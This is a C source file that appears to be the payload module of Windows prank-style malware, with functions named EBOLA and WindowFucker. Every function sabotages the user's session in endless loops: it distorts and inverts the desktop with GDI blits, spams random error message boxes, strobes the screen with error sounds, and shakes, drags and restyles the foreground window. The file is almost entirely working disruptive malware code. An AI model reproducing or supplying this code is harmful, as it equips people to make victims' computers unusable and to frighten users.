#include "CoV.h"

char* mkrndstr(size_t length) {
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!";
	char* randomString = "";
	if (length) {
		randomString = malloc(length + 1); 
		if (randomString) {
			int l = (int)(sizeof(charset) - 1);
			int key;
			for (int n = 0; n < length; n++) {
				key = rand() % l;
				randomString[n] = charset[key];
			}
			randomString[length] = '\0';
		}
	}
    return randomString;
}

BOOL CALLBACK WindowLongFucker(LPVOID parameter) {
	while (1) {
		HWND hwnd = GetForegroundWindow();
		SetWindowLong(hwnd, GWL_STYLE, rand());
		SetWindowLong(hwnd, GWL_EXSTYLE, rand());
		Sleep(rand() % 40000);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	HICON hcon = NULL;
	if (hcon != NULL)
		DestroyIcon(hcon);
	hcon = LoadIcon(NULL, IDI_WARNING);
	SendMessage(hwnd, WM_SETICON, ICON_BIG, (LPARAM)hcon);
	SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hcon);
	return 0;
}

DWORD WINAPI SetIcons(LPVOID parameter) {
	while (1) {
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}

DWORD WINAPI RandomMsg(LPVOID parameter) {
	while (1) {
		MessageBoxA(0, mkrndstr(rand() % 900), mkrndstr(rand() % 50), MB_ICONERROR | MB_OK);
		Sleep(rand() % 15000);
	}
}

DWORD WINAPI IconWave(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		float x1 = 0;
		float y1 = 0;
		float y2 = 0;
		float eF = 40;
		float yEx = rand() % h - 10;
		for (float x = 0; x < 60; x += 0.1F) {
			y2 = (float)sin(x);
			DrawIcon(hdc, x1 * eF, y1 * eF + yEx, LoadIcon(NULL, IDI_ERROR));
			x1 = x;
			y1 = y2;
			Sleep(10);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI day30_(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		for (int i = 0; i < 50; i++) {
			BitBlt(hdc, rand() % 8, rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, rand() % 8, rand() % 8, SRCCOPY);
		}
		for (int i = 0; i < 50; i++) {
			StretchBlt(hdc, +16, +3, w - 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
		}
		Sleep(3000);
		for (int i = 0; i < 50; i++) {
			StretchBlt(hdc, -16, -16, w + 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
		}
		Sleep(3000);
		for (int i = 0; i < 50; i++) {
			StretchBlt(hdc, -16, +16, w + 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
		}
		Sleep(3000);
		for (int i = 0; i < 50; i++) {
			StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
		}
		Sleep(3000);
		for (int i = 0; i < 50; i++) {
			StretchBlt(hdc, +16, +16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
		}
		ReleaseDC(0, hdc);
		Sleep(10000);
	}
}

DWORD WINAPI CoolIconDraw(LPVOID parameter) {
	double a2 = 0;
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		DrawIcon(hdc, rect.left + (int)(sin(a2) * (double)w), rect.top + (int)a2, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.left + (int)(sin(a2) * (double)w), rect.bottom - (int)a2, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.right - (int)a2, rect.top + (int)(sin(a2) * (double)h), LoadIcon(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.left + (int)a2, rect.top + (int)(sin(a2) * (double)h), LoadIcon(NULL, IDI_ERROR));
		if (a2 > h)
			a2 = 0;
		a2 += 0.3;
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI EBOLA(LPVOID parameter) {
	HDC hdc = GetWindowDC(GetDesktopWindow());
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	RECT size = { rect.right - rect.left, rect.bottom - rect.top };

	for (int i = 0; i < 10; i++) {
		HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
		PlaySoundA("SystemHand", GetModuleHandle(NULL), SND_ASYNC);
		FillRect(hdc, &size, brush);
		Sleep(500);
		brush = CreateSolidBrush(RGB(255, 255, 255));
		PlaySoundA("SystemHand", GetModuleHandle(NULL), SND_ASYNC);
		FillRect(hdc, &size, brush);
		Sleep(800);
	}
	ReleaseDC(0, hdc);
	return 0;
}

DWORD WINAPI GlitchDown(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		StretchBlt(hdc, 10, 0, w - 10, h + 10, hdc, 0, 0, w, h, SRCERASE);
		StretchBlt(hdc, 0, 10, w - 10, h + 10, hdc, 0, 0, w, h, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}

DWORD WINAPI FlipStrechGlitch(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		for (int i = 0; i < 3; i++) {
			StretchBlt(hdc, 0, h, w + 10, h - rand(), hdc, 0, 0, w, h, SRCPAINT);
			Sleep(1);
		}
		ReleaseDC(0, hdc);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI CopyLag(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		BitBlt(hdc, rand() % 80, rand() % 80, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -rand() % 80, -rand() % 80, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI GlitchAround(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		BitBlt(hdc, rand() % (w - 400), rand() % (h - 400), (rand() % 60) + 1000, h - 100, hdc, (rand() % w) - (150 / 2), 0, NOTSRCERASE);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI IconPainter(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		int xpos1 = rand() % (w - rand() % 321);
		int ypos1 = rand() % (h - rand() % 321);
		DrawIcon(hdc, xpos1, ypos1, LoadIcon(NULL, IDI_WARNING));
		BitBlt(hdc, xpos1, ypos1, 32, 32, hdc, xpos1, xpos1, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI SlowInvertPaint(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		for (int i = 0; i < h; i++) {
			BitBlt(hdc, 0, i, w, 1, hdc, 0, i, NOTSRCCOPY);
			Sleep(1);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI InAndOut(LPVOID parameter) {
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		for (int i = 0; i < 100; i++) {
			StretchBlt(hdc, -16, -16, w + 32, h + 32, hdc, 0, 0, w, h, SRCCOPY);
			Sleep(1);
		}
		for (int i = 0; i < 70; i++) {
			StretchBlt(hdc, +16, +16, w - 32, h - 32, hdc, 0, 0, w, h, SRCCOPY);
			Sleep(1);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI ShakeWindows(LPVOID parameter) {
	while (1) {
		HWND hwnd = GetForegroundWindow();
		RECT rect = { NULL };

		GetWindowRect(hwnd, &rect);

		MapWindowPoints(HWND_DESKTOP, GetParent(hwnd), (LPPOINT)&rect, 2);

		rect.left += rand() % 8 - 4;
		rect.top += rand() % 8 - 4;

		SetWindowPos(hwnd, 0, rect.left, rect.top, 0, 0, 0x0001);
		Sleep(50);
	}
}

DWORD WINAPI Clench(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;

		StretchBlt(hdc, 1, 1, w - 2, h - 1, hdc, 0, 0, w, h, SRCPAINT);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI UpTunnel(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;

		StretchBlt(hdc, 1, 1, w - 2, rand() % h - 1, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI UpDownGlitch(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		for (int i = 0; i < 8; i++) {
			BitBlt(hdc, rand() % 8, rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, rand() % 8, rand() % 8, SRCCOPY);
			Sleep(1);
		}
		for (int i = 0; i < 4; i++) {
			BitBlt(hdc, rand() % 8, rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, -rand() % 8, -rand() % 8, SRCCOPY);
			Sleep(1);
		}
		for (int i = 0; i < 4; i++) {
			BitBlt(hdc, rand() % 8, rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, -rand() % 8, rand() % 8, SRCCOPY);
			Sleep(1);
		}
		for (int i = 0; i < 4; i++) {
			BitBlt(hdc, rand() % 8, rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, rand() % 8, -rand() % 8, SRCCOPY);
			Sleep(1);
		}
		for (int i = 0; i < 8; i++) {
			BitBlt(hdc, -rand() % 8, -rand() % 8, rand() % (w - 100), rand() % (h - 100), hdc, rand() % 8, rand() % 8, SRCCOPY);
			Sleep(1);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI RightDownEnlarge(LPVOID parameter) {
	while (1) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		StretchBlt(hdc, 128, -128, w - 128, h - 128, hdc, 0, 0, w - 100, h - 100, SRCCOPY);
		StretchBlt(hdc, -16, 16, w - 32, h - 32, hdc, 0, 0, w - 100, h - 100, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI DeepUnderMove(LPVOID parameter) {
	while (1) {
		HWND hwnd = GetForegroundWindow();
		RECT rect = { NULL };

		GetWindowRect(hwnd, &rect);

		MapWindowPoints(HWND_DESKTOP, GetParent(hwnd), (LPPOINT)&rect, 2);

		int windowW = rect.right - rect.left;
		int w = GetSystemMetrics(SM_CXSCREEN);

		if (rect.left > w + 3) {
			SetWindowPos(hwnd, 0, -(windowW - 3), rect.top, 0, 0, 0x0001);
			continue;
		}
		SetWindowPos(hwnd, 0, rect.left += +2, rect.top, 0, 0, 0x0001);
		Sleep(50);
	}
}

DWORD WINAPI WindowFucker(LPVOID parameter) {
	while (1) {
		RECT rect;
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect);
		MoveWindow(hwnd, rect.left + rand() % (-2, 3), rect.top + rand() % (-2, 3), rect.right - rect.left + rand() % (-2, 3), rect.bottom - rect.top + rand() % (-2, 3), FALSE);
		SetWindowPos(hwnd, 0, rect.left + rand() % (-2, 3), rect.top + rand() % (-2, 3), rect.right - rect.left + rand() % (-2, 3), rect.bottom - rect.top + rand() % (-2, 3), SWP_ASYNCWINDOWPOS | SWP_NOACTIVATE | SWP_NOOWNERZORDER);
		Sleep(100);
	}
}